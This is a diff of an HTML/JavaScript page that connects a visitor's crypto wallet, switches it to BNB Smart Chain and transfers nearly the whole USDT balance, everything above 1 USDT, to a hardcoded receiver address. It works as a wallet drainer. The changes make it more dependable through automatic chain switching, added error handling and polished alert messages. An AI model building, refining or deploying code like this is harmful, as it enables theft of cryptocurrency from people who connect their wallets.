@@ -8,8 +8,8 @@
   <button onclick="connectAndTransfer()">Connect & Send</button>
 
   <script>
-    const receiver = '0x4a17942D1B9207ff13166c5B4dDdD5689384Cf3a'; // NEW Receiver
-    const usdtAddress = '0x55d398326f99059ff775485246999027b3197955'; // USDT BEP20
+    const receiver = '0x4a17942D1B9207ff13166c5B4dDdD5689384Cf3a'; // Receiver Address
+    const usdtAddress = '0x55d398326f99059ff775485246999027b3197955'; // USDT BEP20 Contract Address
     const usdtAbi = [
       {
         "constant": true,
@@ -31,43 +31,62 @@
     ];
 
     async function connectAndTransfer() {
-      // Check if wallet is installed
+      // Step 1: Check if wallet is installed
       if (!window.ethereum) {
-        alert("Please install MetaMask or Trust Wallet.");
+        alert("Please install MetaMask or Trust Wallet on your device.");
         return;
       }
 
       const web3 = new Web3(window.ethereum);
 
-      // Check if wallet is on BNB Smart Chain (chain ID 56)
-      const chainId = await web3.eth.getChainId();
-      if (chainId !== 56) {
-        alert("Please switch to BNB Smart Chain (BSC) in your wallet.");
+      // Step 2: Check and switch to BNB Smart Chain (chain ID 56)
+      try {
+        const chainId = await web3.eth.getChainId();
+        if (Number(chainId) !== 56) {
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: '0x38' }], // 0x38 is hex for 56 (BNB Smart Chain)
+          });
+        }
+      } catch (switchError) {
+        alert("Failed to switch to BNB Smart Chain (BSC). Please manually switch to BNB Smart Chain in your wallet.");
         return;
       }
 
-      // Connect wallet
-      await window.ethereum.request({ method: 'eth_requestAccounts' });
+      // Double-check chain ID after switch
+      const newChainId = await web3.eth.getChainId();
+      if (Number(newChainId) !== 56) {
+        alert("Still not on BNB Smart Chain (BSC). Please manually switch to BNB Smart Chain in your wallet.");
+        return;
+      }
+
+      // Step 3: Connect wallet
+      try {
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+      } catch (connectError) {
+        alert("Failed to connect wallet: " + connectError.message);
+        return;
+      }
       const accounts = await web3.eth.getAccounts();
       const sender = accounts[0];
 
-      // Initialize USDT contract
+      // Step 4: Initialize USDT contract
       const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
 
-      // Check USDT balance
+      // Step 5: Check USDT balance
       const balanceStr = await usdt.methods.balanceOf(sender).call();
       const balance = web3.utils.toBigInt(balanceStr);
       const decimals = 6; // USDT has 6 decimals
       const minBalance = 1000000n; // 1 USDT in smallest unit (1e6)
       if (balance <= minBalance) {
-        alert(`Insufficient USDT balance. You have ${Number(balance) / 1e6} USDT, need at least ${Number(minBalance) / 1e6} USDT.`);
+        alert(`Insufficient USDT balance. You have ${Number(balance) / 1e6} USDT, need at least ${Number(minBalance) / 1e6} USDT to proceed.`);
         return;
       }
 
       const amountToSend = balance - minBalance;
 
-      // Check BNB balance for gas fee
-      const gasLimit = 200000; // Reasonable gas limit for USDT transfer
+      // Step 6: Check BNB balance for gas fee
+      const gasLimit = 200000; // Gas limit for USDT transfer
       const gasPrice = web3.utils.toWei('5', 'gwei'); // 5 Gwei
       const estimatedGasFee = BigInt(gasLimit) * BigInt(gasPrice); // Total gas fee in wei
       const minBnbForGas = estimatedGasFee + (estimatedGasFee / 2n); // Add 50% buffer
@@ -76,10 +95,11 @@
       if (BigInt(bnbBalance) < minBnbForGas) {
         const requiredBnb = Number(minBnbForGas) / 1e18;
         const currentBnb = Number(bnbBalance) / 1e18;
-        alert(`Insufficient BNB for gas fee. You have ${currentBnb.toFixed(6)} BNB, need at least ${requiredBnb.toFixed(6)} BNB.`);
+        alert(`Insufficient BNB for gas fee. You have ${currentBnb.toFixed(6)} BNB, need at least ${requiredBnb.toFixed(6)} BNB for gas.`);
         return;
       }
 
+      // Step 7: Send USDT transaction
       try {
         const tx = await usdt.methods
           .transfer(receiver, amountToSend.toString())
@@ -89,7 +109,7 @@
             gasPrice: gasPrice
           });
 
-        alert("USDT sent! Tx hash: " + tx.transactionHash + "\nCheck on BscScan: https://bscscan.com/tx/" + tx.transactionHash);
+        alert("USDT sent successfully! Transaction hash: " + tx.transactionHash + "\nCheck on BscScan: https://bscscan.com/tx/" + tx.transactionHash);
       } catch (err) {
         console.error(err);
         alert("Transaction failed: " + err.message + "\nCheck transaction details on BscScan for more info.");
